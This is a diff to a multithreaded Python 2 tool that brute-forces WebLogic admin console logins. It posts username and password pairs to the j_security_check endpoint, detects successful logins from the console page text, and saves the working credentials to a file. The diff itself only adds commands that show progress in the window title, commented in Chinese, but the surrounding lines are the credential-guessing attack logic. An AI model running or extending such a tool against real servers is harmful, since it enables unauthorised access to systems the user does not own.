@@ -46,6 +46,7 @@ def post(i,mythreads):
 				data = {'j_username':usr,'j_password':pwd}
 				s = requests.post(i+'/j_security_check',data =data,timeout=5)
 				if s.content.count('Home Page') !=0 or s.content.count('WebLogic Server Console') !=0 or s.content.count('console.portal') !=0:
+					os.system("title Current threads: %d,URLs left: %%d" %threading.active_count()%mythreads.qsize()) #更改窗口标题，如觉得太消耗CPU资源可以注释掉
 					print i,'Success!!!!!' 
 					print usr+'/'+pwd
 					f=open(xtime+'.txt', 'a')
@@ -57,6 +58,7 @@ def post(i,mythreads):
 					return #成功，停止循环
 				else:
 					if co == sum: #达到总尝试次数，则输出失败
+						os.system("title Current threads: %d,URLs left: %%d" %threading.active_count()%mythreads.qsize()) #更改窗口标题，如觉得太消耗CPU资源可以注释掉
 						#print i,'Failed!'
 						f = open("bad.txt", 'a')
 						f.write(i+'\n')
